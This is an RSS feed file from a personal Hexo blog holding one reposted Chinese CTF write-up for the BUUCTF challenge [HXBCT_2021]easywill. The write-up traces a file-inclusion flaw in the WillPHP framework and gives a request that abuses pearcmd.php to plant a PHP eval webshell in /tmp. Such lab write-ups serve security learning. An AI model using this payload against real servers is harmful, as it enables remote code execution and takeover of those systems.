@@ -1,0 +1,117 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;willphp2.2&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Tue, 05 Nov 2024 14:48:54 +0800</pubDate>
+        <lastBuildDate>Tue, 05 Nov 2024 14:48:54 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/11/05/HXBCT-2021-easywill/</guid>
+            <title>[HXBCT_2021]easywill</title>
+            <link>http://odiws.github.io/2024/11/05/HXBCT-2021-easywill/</link>
+            <category>buuctf</category>
+            <category>willphp2.2</category>
+            <pubDate>Tue, 05 Nov 2024 14:48:54 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;hxbct_2021easywill&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hxbct_2021easywill&#34;&gt;#&lt;/a&gt; [HXBCT_2021]easywill&lt;/h2&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/e0a25038b09956fb373c468cfd1c6742.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这题 index 上给的代码很短，需要下载框架源码，自行修改审计。我没找到 2.1.5 的源码，下了个最新的。这题比赛的时候看了到 assign 函数还以为是个模板注入的题以为要爆破模板变量名就没去整了。还是对调试这种不太熟吧，下意识不想审计框架的函数调用&lt;/p&gt;
+&lt;p&gt;下面开始审计，修改 app/controller/IndexController.php 的内容与题目给出的一致&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/9ad16222b7834907d68c96eba474b106.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;先跟踪 assign 函数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/40e90aa89ff48f974be1a581fd4b920e.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/dd0d0cad4f3b00bcc99a7beae73d032b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;assign 只是做一个赋值的作用 传递给 view 当中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/90d464a14ff58d2d99a85a05a2176487.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;再看 view 函数&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/4190741973dd63dfef13d2e6d05f23e9.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/48e3f9825649f30f662cfc78d5225b17.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/2786d46e6353bc38700ca3da07adc943.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/629c3064ed9eeef075950e674c36c3ab.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到存在变量覆盖以及文件包含&lt;/p&gt;
+&lt;p&gt;开启 debug 可以看到函数调用栈，这里测试传参为 &amp;amp; name=cfile&amp;amp;value=1&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/1ce743e5d6245779915f9e6319b65ff7.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;写入 shell 到 tmp 目录，这里为什么包含 pearcmd.php 的原因详见：利用 pearcmd.php 从 LFI 到 getshell_feng 的博客 - CSDN 博客&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/6a402e8cec85a18bb81515185aef8f59.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/?name=cfile&amp;amp;value=/usr/local/lib/php/pearcmd.php&amp;amp;+-c+/tmp/test2.php+-d+man_dir=&amp;lt;?eval($_POST[0]);?&amp;gt;+-s+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://zty--666.oss-cn-shanghai.aliyuncs.com/202411051504825.png&#34; alt=&#34;image-20241105150358707&#34;&gt;&lt;/p&gt;
+&lt;p&gt;记得用 burp 浏览器直接打的话 &amp;lt;&amp;gt; 会被 url 编码，写马就不解析了&lt;/p&gt;
+&lt;p&gt;转载（没有源码，只能下下来了）：&lt;/p&gt;
+&lt;h4 id=&#34;原文链接httpsblogcsdnnetweixin_43610673articledetails121369384&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原文链接httpsblogcsdnnetweixin_43610673articledetails121369384&#34;&gt;#&lt;/a&gt; 原文链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzYxMDY3My9hcnRpY2xlL2RldGFpbHMvMTIxMzY5Mzg0&#34;&gt;https://blog.csdn.net/weixin_43610673/article/details/121369384&lt;/span&gt;&lt;/h4&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
